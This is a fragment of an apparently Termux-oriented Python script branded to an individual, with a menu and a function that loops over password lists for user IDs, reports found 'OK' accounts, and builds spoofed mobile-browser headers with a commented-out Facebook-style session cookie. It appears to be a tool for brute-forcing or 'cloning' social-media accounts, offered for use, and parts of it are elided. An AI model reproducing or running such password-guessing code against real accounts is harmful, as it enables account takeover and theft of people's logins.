#tools by TANJID VAI JAVA SCRIPT TERMUX COMMAND 
...
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                    
 {gn}Owner    : {cn}JAMAN{ed}
 {gn}Guthub   : {cn}JAMAN-VAI-120{ed}
 {gn}Facebook : {cn}Md Saruar Jaman {ed}
 {gn}Taligram : {wn}https://t.me/srjaman{ed}
 {gn}Tools    : {cn}RANK{pn} •{gn}[{cn}version \033[1;42m{rn}•1.0•{ed}{gn}]{ed}
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ed}''')
# MAIN MANU 
def Main():
        os.system("clear")
        ...
        if jubair in ["1","01"]:
            sexy()
        if jubair in ["2","02"]:
        	os.system('xdg-open https://t.me/srjaman')
        if jaman in [" 0", "00"]:
            exit()
        else:
            exit()     
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[JAMAN-FIND]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=6R4qZW3ZH2uyb9AvGInAHgqn; sb=6R4qZZKPmKoLZd8sgiufeePA; wd=360x660; fr=03AJJzOj8BL7vhaou..BlKh7p.AE.AAA.0.0.BlLQM8.AWV4Wedvum4',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Huawei Y9 2019"',
